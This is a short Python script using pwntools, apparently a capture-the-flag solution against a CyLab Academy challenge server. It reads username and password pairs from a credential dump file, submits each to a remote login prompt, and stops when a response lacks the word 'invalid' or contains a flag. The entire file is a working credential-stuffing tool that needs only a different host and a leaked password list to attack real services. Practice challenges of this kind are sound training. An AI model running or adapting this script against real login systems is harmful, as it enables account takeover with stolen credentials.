#!/usr/bin/env python3
from pwn import *
import sys

# ---------------- CONFIG ----------------
HOST, PORT = "chatelaine.cylabacademy.net", 12082
CREDS_FILE = "creds-dump.txt"
SEP        = ";"
USER_PROMPT = b"Username:"
PASS_PROMPT = b"Password:"
FAIL_HINT   = b"invalid"          # <-- matches "Invalid username or password"
SUCCESS_MARK = b"flag{"           # optional explicit win marker
# -----------------------------------------

context.log_level = "error"

def attempt(user, pw):
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(USER_PROMPT, timeout=5)
        r.sendline(user.encode())
        r.recvuntil(PASS_PROMPT, timeout=5)
        r.sendline(pw.encode())
        out = r.recvall(timeout=5)
        r.close()
        return out
    except Exception:
        return b""

def is_hit(out):
    if not out:
        return False
    if SUCCESS_MARK in out:
        return True
    return FAIL_HINT not in out.lower()   # win = output WITHOUT "invalid"

tried = 0
with open(CREDS_FILE, "r", errors="ignore") as f:
    for line in f:
        line = line.strip()
        if not line or SEP not in line:
            continue
        user, pw = line.split(SEP, 1)
        user, pw = user.strip(), pw.strip()
        if not user or not pw:
            continue
        tried += 1
        out = attempt(user, pw)
        if is_hit(out):
            print("\n=== HIT ===")
            print(f"user={user}  pass={pw}")
            print(out.decode(errors="replace"))
            sys.exit(0)
        if tried % 25 == 0:
            print(f"...{tried} tried (last: {user})")

print(f"\ntried {tried} pairs, no hit")
